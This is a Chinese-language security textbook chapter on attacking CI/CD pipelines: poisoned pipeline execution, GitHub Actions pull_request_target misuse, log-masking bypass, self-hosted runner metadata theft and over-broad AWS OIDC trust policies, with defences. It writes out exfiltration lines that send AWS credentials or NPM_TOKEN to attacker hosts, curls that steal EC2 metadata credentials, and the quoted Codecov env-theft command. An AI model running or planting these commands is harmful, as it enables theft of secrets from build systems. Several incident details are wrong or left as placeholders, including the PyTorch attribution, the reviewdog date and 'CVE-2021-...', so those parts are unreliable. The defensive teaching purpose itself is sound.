# Ch 31 — CI/CD 攻擊面：pipeline poisoning 與 OIDC 信任濫用

> **目標**：理解為什麼 CI/CD pipeline 是現代最高價值的攻擊目標之一，掌握 pipeline poisoning（直接與間接）的技術細節，搞清楚 GitHub Actions 的五個主要攻擊面，特別是 OIDC trust policy 寫太寬如何讓任何 repo 都能 assume 你的 AWS role。防禦方向同步點出，但防禦深度留給 Ch 32 與 Ch 33。

Ch 28 和 Ch 29 把 K8s cluster 打穿了——從節點爬到 cluster-admin，再往 AWS IAM 延伸。這章換個攻擊起點：**不進 cluster，從 CI/CD pipeline 側入**。這條路徑在真實攻擊裡更常見，因為開發者的 PR 合併習慣比 K8s RBAC 設定更容易被人為疏忽。

---

## 為什麼需要

CI/CD pipeline 有三個特性讓它成為最好的橫向移動跳板：

**1. 高權憑證集中在一個地方**

Pipeline 需要推 image 到 registry、部署到 K8s、存取 Secrets Manager、assume AWS role。這些權限不得不集中在 CI runner 上。同樣的邏輯：攻擊者只要拿下 pipeline，就等比例地拿下這些存取權。

**2. 程式碼觸發 = 程式碼執行**

和傳統的「機器有洞→入侵→提權」不一樣，CI/CD 的觸發機制直接是**「merge PR → CI 跑 shell command」**。攻擊者不需要 exploit，只需要讓惡意的程式碼進入觸發 CI 的路徑。

**3. PR review 有盲區**

開發者 review PR 看的是業務邏輯，不是 `.github/workflows/*.yml` 裡的 `run:` 指令。即使是資深工程師，也不一定注意到 `test.sh` 裡多了一條 `curl attacker.com/$(cat ~/.aws/credentials | base64)`。

---

## 先建直覺：pipeline 就是一條權限管道

```
developer push / PR
        │
        ▼
┌───────────────────────────────────────────────────────┐
│               CI/CD Pipeline                          │
│                                                       │
│  clone repo → install deps → run tests → build image │
│                    │                           │      │
│              讀取 source code           push registry │
│                                               │      │
│                            deploy → K8s / AWS / GCP  │
│                                                       │
│  pipeline 擁有：                                      │
│   - $AWS_ACCESS_KEY 或 OIDC role                     │
│   - KUBECONFIG（cluster admin）                       │
│   - DOCKER_TOKEN（push registry）                     │
│   - NPM_TOKEN / PYPI_TOKEN（推套件）                  │
└───────────────────────────────────────────────────────┘
        │
        ▼
   所有這些存取 = 攻擊者的目標
```

攻擊者的目標不是「執行一段 code」，而是透過那段 code **存取 pipeline 持有的憑證**，然後用那些憑證橫向移動到 prod 環境。

---

## 底層機制

### Pipeline Poisoning（管道投毒）

Alex Circei（Palo Alto Unit 42）和 RWX 研究團隊（Cider Security，後被 Palo Alto 收購）把這類攻擊系統化成「Poisoned Pipeline Execution（PPE）」模型，分三種路徑：

**直接 PPE（D-PPE）**：攻擊者有能力直接修改 CI 設定檔

觸發條件：取得 repo 寫入權，或利用設定錯誤讓外部 PR 直接跑 privileged 設定

```
攻擊者 fork repo → 改 .github/workflows/ci.yml → 開 PR
                                    ↓
                         ci.yml 含惡意 run: 指令
                                    ↓
                    PR 觸發 CI → 惡意指令執行 → 憑證洩漏
```

**間接 PPE（I-PPE）**：攻擊者無法改 CI 設定，但能改 CI 設定執行的腳本

觸發條件：CI 設定 `run: ./scripts/test.sh`，而 `test.sh` 在同一 repo，PR 改了 `test.sh` 就能執行任意 code

```
.github/workflows/ci.yml   ← 受保護，PR 不能觸發 privileged CI
scripts/test.sh             ← 攻擊者修改這個
package.json scripts        ← 或這個（npm test → 惡意 pretest hook）
Makefile                    ← 或這個
conftest.py / pytest.ini    ← 測試框架 plugin/hook
```

**Public PPE（3P）**：上游依賴（npm、PyPI、Go module）投毒，build 時 `npm install` 拉到惡意版本

這三種路徑都不需要直接攻破 CI 伺服器，只需要讓惡意 code 進入 pipeline 的執行路徑。

---

### GitHub Actions 五個主要攻擊面

#### 攻擊面一：`pull_request_target` 危險設計

`pull_request` 和 `pull_request_target` 是兩個不同的 event：

```yaml
# 安全：on: pull_request
# workflow 在 PR 的 fork context 執行，沒有 secrets 存取

# 危險：on: pull_request_target
# workflow 在 BASE REPO context 執行，有 secrets 存取
# 但 PR 來自 fork，fork 的 code 可以影響 workflow 執行的 steps
```

最危險的組合（**本段為理論說明，真實 CI 請驗證行為**）：

```yaml
on:
  pull_request_target:    # 在 base repo context 執行 = 有 secrets
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # 這行把 PR 的 code 拉進來
      - run: npm install && npm test                       # 跑 PR 裡的 code，但有 secrets 存取
```

`actions/checkout@v4` 加上 `ref: ${{ github.event.pull_request.head.sha }}` 等於把 PR 的程式碼 checkout 出來，然後在有 `secrets` 存取的 context 裡執行。攻擊者改 `package.json` 的 `test` script，就能在有 secrets 的環境裡執行任意指令。

CVE-2021-... 的 `actions/upload-artifact` 等多個 GitHub 官方 action 都曾因為這個組合出現漏洞。

#### 攻擊面二：secrets 在 log 裡洩漏

GitHub Actions 會把 `secrets.*` 的值 mask 掉（替換成 `***`），但這個 masking 不是密碼學保證——只是字串替換：

```yaml
- name: 故意把 secret 拆開洩漏
  run: |
    # 攻擊者可以這樣繞過 masking：
    secret="${{ secrets.AWS_SECRET_KEY }}"
    echo ${secret:0:4}    # 輸出前 4 個字元
    echo ${secret:4:4}    # 輸出第 5-8 個字元
    # 每次輸出片段，掃 log 就能還原完整 secret
```

更常見的是無意洩漏：

```bash
# 有人在 run: 裡加了 env 或 printenv 除錯，忘記移掉
- run: env    # 把所有環境變數（含 secrets）印出來
```

#### 攻擊面三：self-hosted runner 被濫用

GitHub 提供的 hosted runner（`ubuntu-latest`、`windows-latest`）是乾淨的 VM，每次 job 都是全新環境。

Self-hosted runner 是你自己管理的機器，問題在於：

```
self-hosted runner 的持久化問題：
  - runner process 跑在你的 EC2 / K8s pod 上
  - 這台機器可能有 IAM instance role（EC2）或 ServiceAccount token（K8s pod）
  - 如果 runner 接受 public repo 的 PR，攻擊者提 PR 就能在這台機器上執行 code
  - 惡意 code 可以：
      curl http://169.254.169.254/latest/meta-data/iam/...   # 偷 EC2 instance role
      cat /var/run/secrets/kubernetes.io/serviceaccount/token  # 偷 K8s SA token
  - runner 的 ~/.aws/credentials、KUBECONFIG 也是目標
```

2022 年 PyTorch 的供應鏈攻擊就是透過 self-hosted runner 滲透，攻擊者讓 runner 執行惡意 code 後偷走了 PyPI token，推了一個惡意版本的 `torchtriton`（PyTorch 的依賴）到 PyPI，因為 PyPI 發布優先於私有 registry 查找，用戶 `pip install torch` 就會拉到惡意版本。

#### 攻擊面四：third-party action 供應鏈

```yaml
steps:
  - uses: actions/checkout@v4        # GitHub 官方，相對可信
  - uses: crazy-max/ghaction-import-gpg@v6   # 第三方 action
  - uses: some-company/deploy-action@main    # 危險：@main 是可變 ref
```

`@main` 指向的是一個 git ref，可以在不改 workflow 的情況下被更換——action 的維護者改了 `main` 分支的 code，所有使用者的下一次執行都會跑到新 code。

2021 年的 `reviewdog/action-setup@v1` 被攻陷，action 的 maintainer 帳號被入侵後攻擊者推了惡意 commit 到 `v1` tag，所有使用者的 CI 都執行了 secrets 外洩的 code。

正確的做法是 pin 到 commit SHA：

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

這個 SHA 是 content-addressable，沒有人能在不改 SHA 的情況下替換這個 commit 的內容。

#### 攻擊面五：OIDC 信任濫用

這是本章最值得深入的攻擊面，技術上最複雜，但影響範圍最廣。

---

## 具體範例

### 範例一：I-PPE 透過 package.json 投毒

目標 repo 的 CI workflow：

```yaml
# .github/workflows/ci.yml
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test
```

攻擊者 fork repo，在 PR 裡改 `package.json`：

```json
{
  "scripts": {
    "pretest": "curl -s https://attacker.example/collect -d \"t=$(echo $NPM_TOKEN | base64)\" &",
    "test": "jest"
  }
}
```

`pretest` 在 `npm test` 之前自動執行（npm 的 lifecycle hook）。CI runner 執行 `npm test` 時，先跑 `pretest`，把 `NPM_TOKEN` 送到攻擊者控制的 endpoint。整個過程在 CI log 裡顯示的是正常的 `npm test`。

**邊界案例**：如果 workflow 用 `on: pull_request` 而不是 `pull_request_target`，這個攻擊在 GitHub Actions 上沒有 secrets 存取（fork context 下 secrets 是空的）。但如果是 GitLab CI、CircleCI 等預設讓外部 PR 存取 secrets 的系統，這個攻擊直接有效。

### 範例二：OIDC trust policy 寫太寬

GitHub Actions 可以用 OIDC（OpenID Connect，開放身份連接協定）換 AWS 臨時憑證，不需要儲存長期的 `AWS_ACCESS_KEY_ID`：

```
GitHub Actions runner
        │
        │ 1. 取得 OIDC token（JWT）
        │    iss: token.actions.githubusercontent.com
        │    sub: repo:myorg/myrepo:ref:refs/heads/main
        │
        ▼
AWS STS AssumeRoleWithWebIdentity
        │
        │ 2. 驗證 JWT 簽名
        │ 3. 對比 trust policy 的 condition
        │
        ▼
   回傳臨時憑證（15分鐘 - 12小時）
```

問題出在 AWS IAM role 的 trust policy 怎麼寫：

**危險寫法**（實際可能造成的設定）：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:myorg/*"
        }
      }
    }
  ]
}
```

`"repo:myorg/*"` 的意思是：myorg 底下**任何 repo**、**任何 branch**、**任何事件**觸發的 workflow 都能 assume 這個 role。

如果這個 role 有 `AdministratorAccess`，攻擊者只需要在 myorg 底下建一個新 repo，或者找到一個有貢獻者存取的 repo，就能 assume admin role。

**更危險**：有些教程甚至這樣寫：

```json
"StringLike": {
  "token.actions.githubusercontent.com:sub": "*"
}
```

`*` 等於**任何 GitHub Actions workflow，包括其他 organization 的**。任何人在 GitHub 上建 repo 跑一個 workflow 就能 assume 你的 AWS role。

**收緊後的安全寫法**：

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main",
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
    }
  }
}
```

- `StringEquals`（不是 `StringLike`）：精確比對，不允許萬用字元
- `sub` 鎖定到特定 repo + 特定 branch（`refs/heads/main`）
- `aud` 確認 audience 是 `sts.amazonaws.com`，防止 token replay 到其他服務

OIDC JWT 的 `sub` claim 格式：

```
repo:{org}/{repo}:ref:refs/heads/{branch}    # 從特定 branch 觸發
repo:{org}/{repo}:ref:refs/tags/{tag}        # 從特定 tag 觸發
repo:{org}/{repo}:environment:{env}          # 從特定 environment 觸發
repo:{org}/{repo}:pull_request               # 從 PR 觸發（任何 PR）
```

如果 trust policy 允許 `pull_request`，任何人開 PR（包括 fork）都能 assume 這個 role。

### 範例三：self-hosted runner 偷 EC2 instance metadata（失敗案例）

以下示範**攻擊者視角**，說明為什麼 IMDSv2 設定能擋這個攻擊：

攻擊者在 PR 裡加入：

```yaml
# 這段會被 CI 執行
- name: Exfil
  run: |
    # 嘗試偷 EC2 instance role
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

如果 EC2 instance 只啟用 IMDSv1（舊式，不安全）：

```bash
# 直接回傳 role 名稱
ec2-ci-runner-role

# 接著偷 credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-ci-runner-role
# 回傳 AccessKeyId / SecretAccessKey / Token
```

如果 EC2 instance 啟用 IMDSv2（需要先取 session token，TTL 最短 1 秒）：

```bash
# 先取 token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# 用 token 存取
curl -s http://169.254.169.254/latest/meta-data/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

IMDSv2 對 SSRF 的防護在 Ch 10 討論過，但在 CI context 裡，**runner 本身就能執行 shell command**，所以 IMDSv2 的 PUT 方法對本機執行不是障礙——攻擊者可以在 `run:` 裡照樣取 session token。

**真正的防禦**：讓 self-hosted runner 跑在一個沒有 instance role（或最小 instance role）的 EC2 上，用 OIDC 換憑證，而且只允許特定 repo 的 OIDC token。

---

## 真實案例

### SolarWinds Orion（2020）

SolarWinds 的攻擊最終植入點是 build 系統。攻擊者（後確認是俄羅斯 SVR）在 SolarWinds 的 build server 上植入惡意程式，在 `SUNSPOT` 監控 build process 並在特定條件下替換 source file，讓惡意程式碼（`SUNBURST`）被編譯進正式的 Orion 更新包，再透過官方的軟體更新機制推給 18,000 個客戶。

這不是 GitHub Actions 攻擊，但核心邏輯完全相同：**拿下 build/CI 環境 = 拿下所有下游用戶**。

技術分析重點：
- 攻擊者在 build server 上植入的 `SUNSPOT` 監控 `MsBuild.exe` process
- 偵測到特定的 SolarWinds.Orion.Core.BusinessLayer DLL 開始 build 時，悄悄替換 source file
- build 完成後恢復原始 source，讓 source 層面的掃描無法發現
- 惡意 DLL 通過了 SolarWinds 自己的 code signing（因為 build server 就是 signing server）

### Codecov（2021）

2021 年 4 月，Codecov 的 CI script 被篡改。攻擊者入侵了 Codecov 的 Docker Hub 帳號（細節未完全公開，可能是 credential leak），推了一個篡改過的 `codecov/codecov-uploader` image。

受影響的 CI workflow 模式：

```bash
# 許多 CI workflow 這樣用 Codecov：
bash <(curl -s https://codecov.io/bash)
```

篡改過的腳本在上傳 coverage report 的同時，還執行了：

```bash
git remote -v | head -1 | awk '{print $2}' >> /tmp/git.env
env >> /tmp/git.env
curl -sm 0.5 -d "<<<<<< ENV" https://anomalous-domain.com/upload/v2
```

這段 code 把所有環境變數（含 CI secrets）外洩到攻擊者的 endpoint。影響了 Twilio、Rapid7、HashiCorp 等數百個公司的 CI。

教訓：
- 用 pipe-to-bash 模式安裝 CI script 是高風險行為（沒有完整性驗證）
- 供應鏈信任鏈中任何一環（Docker image、安裝腳本）被投毒，都能靜默地外洩所有 secrets
- Codecov 事件後，業界開始認真推行 cosign/sigstore 驗簽（Ch 32 主題）

---

## 對比取捨表

| 觸發事件 | secrets 存取 | 外部貢獻者可觸發 | 風險等級 |
|---|---|---|---|
| `on: push`（main branch）| 有 | 無（需 write 權限）| 低（若 branch 有保護）|
| `on: pull_request`（fork PR）| 無（fork context）| 有 | 低 |
| `on: pull_request_target` | 有 | 有 | 高，需謹慎 |
| `on: workflow_dispatch` | 有 | 需 write 權限才能手動觸發 | 中 |
| `on: schedule` | 有 | 無 | 低 |

| OIDC trust policy 寫法 | 允許的觸發範圍 | 風險 |
|---|---|---|
| `sub: "*"` | 任何 GitHub workflow | 嚴重 |
| `sub: "repo:myorg/*"` | org 下任意 repo + branch + event | 高 |
| `sub: "repo:myorg/myrepo:*"` | 特定 repo 的任意 branch + event | 中 |
| `sub: "repo:myorg/myrepo:ref:refs/heads/main"` | 特定 repo 的特定 branch | 低 |
| `sub: "repo:myorg/myrepo:environment:production"` | 特定 repo 的特定 deploy environment | 最低 |

| action 引用方式 | 安全性 | 可升級性 |
|---|---|---|
| `@main` / `@master` | 最低：任何 push 都能改變行為 | 自動跟最新 |
| `@v4`（tag）| 低：tag 可被移動或刪除再重建 | 跟 v4 minor update |
| `@v4.2.2`（semver tag）| 中：tag 仍可被移動 | 手動升 major |
| `@sha256:...`（commit SHA）| 最高：不可變 | 需手動更新，用 Dependabot |

---

## 踩雷集錦

**1. `actions/checkout` 預設 checkout base branch，加 `ref` 才 checkout PR 的 code**

許多人不知道 `pull_request_target` 事件下，`actions/checkout@v4` 預設 checkout 的是 **base branch**（你的 main），不是 PR 的 code。危險的是有人加了 `ref: ${{ github.event.pull_request.head.sha }}` 想「讓 CI 跑 PR 的 code」，但忘了這樣做在 `pull_request_target` context 下等於在有 secrets 的環境裡執行不受信任的 PR code。

**2. GitHub 的 secrets masking 不是安全邊界**

secrets masking 會把 `${{ secrets.FOO }}` 的值替換成 `***`，但只對**完整的字串**做替換。如果 secret 被 base64 編碼、分段輸出、或是 JSON 序列化後輸出，masking 就失效了。secret 洩漏後不能靠「但 log 裡有 mask」來安心。

**3. Self-hosted runner group 設定沒有 isolation**

GitHub 的 runner group 可以限制哪些 repo 能使用這個 group 的 runner，但 runner 本身是一台機器——如果同一台 runner 先跑了 job A（有高權限），再跑了 job B（來自 fork PR），job A 留下的 temp files、cache、甚至環境變數殘留，可能被 job B 讀到。GitHub 建議每次 job 結束後 runner 自動重置（ephemeral runner），但這需要明確設定。

**4. OIDC 的 `aud` claim 必須驗**

許多 OIDC trust policy 只設 `sub` condition，沒設 `aud`。OIDC token 的 `aud`（audience）是 token 的預計使用對象——GitHub Actions 會設 `aud: sts.amazonaws.com`，但如果你的系統接受任何 `aud`，一個 GitHub token 本來是給 A 服務用的，可以被 replay 到 B 服務。

**5. Dependabot PR 不是完全安全的**

Dependabot 自動升依賴發的 PR 跑的 workflow 預設沒有 secrets 存取，但如果你的 CI 設定了自動 approve Dependabot PR 再 auto-merge，攻擊者可以透過投毒 npm 套件讓 Dependabot 提 PR，然後等 auto-merge 後在有 secrets 的 push workflow 裡執行惡意 code。

---

## 進階延伸

### GitHub Actions 安全掃描工具

`actionlint` 是靜態分析 GitHub Actions workflow 的工具：

```bash
# 安裝
go install github.com/rhysd/actionlint/cmd/actionlint@latest
# 或
brew install actionlint

# 掃整個 repo 的 workflow
actionlint

# 掃特定檔案
actionlint .github/workflows/ci.yml
```

actionlint 能偵測：
- `pull_request_target` + `actions/checkout` 的危險組合
- 沒有 pin SHA 的第三方 action
- 未設 `permissions:` 限制 GITHUB_TOKEN 權限
- expression injection（直接把 PR 的 title/body 插進 shell command）

### GITHUB_TOKEN 的最小權限設定

GitHub Actions 的 `GITHUB_TOKEN` 預設權限比想象中高，應該在 workflow 層級明確收緊：

```yaml
permissions:
  contents: read      # 只需要 checkout
  packages: write     # 需要 push image 到 ghcr.io

jobs:
  build:
    permissions:
      contents: read  # job 層級覆蓋 workflow 層級
```

在 org 層級可以把預設改成 `read-only`（Settings → Actions → Workflow permissions），讓所有 workflow 都需要明確聲明需要的權限。

---

## 本章重點整理

- CI/CD pipeline 集中了部署所需的全部高權憑證，拿下 pipeline = 拿下 prod 環境
- PPE 分三路：直接改 CI 設定（D-PPE）、改 CI 執行的腳本（I-PPE）、投毒上游依賴（3P）
- `pull_request_target` + `actions/checkout` 加 `ref` 指向 PR head 是 GitHub Actions 最經典的危險組合，外部 PR 可在有 secrets 的環境裡執行任意 code
- OIDC trust policy 的 `sub` condition 用 `StringLike` 加萬用字元是嚴重 misconfig，應用 `StringEquals` 鎖定到特定 repo + branch + environment
- Third-party action 應 pin commit SHA，不用 tag（tag 可被移動）
- Self-hosted runner 需要 ephemeral（每 job 重置）設計，且不能讓 public fork PR 觸發有高權限 runner 的 workflow
- SolarWinds 和 Codecov 案例說明：build/CI 環境一旦被滲透，影響面等比例擴大到所有下游用戶

---

## 自我檢核

1. D-PPE 和 I-PPE 的差別在哪？各自的攻擊前提條件是什麼？
2. `on: pull_request` 和 `on: pull_request_target` 在 secrets 存取上的關鍵差異是什麼？
3. OIDC 的 `sub` claim 格式是什麼？`"repo:myorg/*"` 和 `"repo:myorg/myrepo:ref:refs/heads/main"` 在安全性上差在哪裡？
4. 為什麼 pin 第三方 action 要用 commit SHA 而不是 semver tag？
5. Codecov 案例中，攻擊者用什麼方法讓惡意 code 進入 CI pipeline？教訓是什麼？
6. GitHub 的 secrets masking 有什麼侷限？

---

## 延伸閱讀

- [Cider Security — Top 10 CI/CD Security Risks](https://www.cidersecurity.io/top-10-cicd-security-risks/)（PPE 的原始分類框架，現在改為 Palo Alto 維護）
- [GitHub Security Lab — Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)（`pull_request_target` 危險組合的官方分析）
- [CNCF — Software Supply Chain Security Paper](https://github.com/cncf/tag-security/blob/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf)（供應鏈安全的全面框架）
- [Praetorian — GitHub OIDC Deep Dive](https://www.praetorian.com/blog/aws-iam-assume-role-via-github-actions-oidc/)（OIDC trust policy 的具體攻擊與防禦分析）
- [actionlint — GitHub Actions workflow linter](https://github.com/rhysd/actionlint)（靜態分析 workflow，附完整 rules 說明）

---

CI/CD 的攻擊面清楚了。下一章換防禦視角：image 和 artifact 怎麼簽章、SBOM 怎麼產生、SLSA 框架的 provenance 怎麼用、admission 控制器怎麼在 K8s 層面拒絕沒有驗簽的 image。

→ [Ch 32 供應鏈防護：SBOM / cosign / SLSA / admission 驗簽](./32-supply-chain-defense.md)
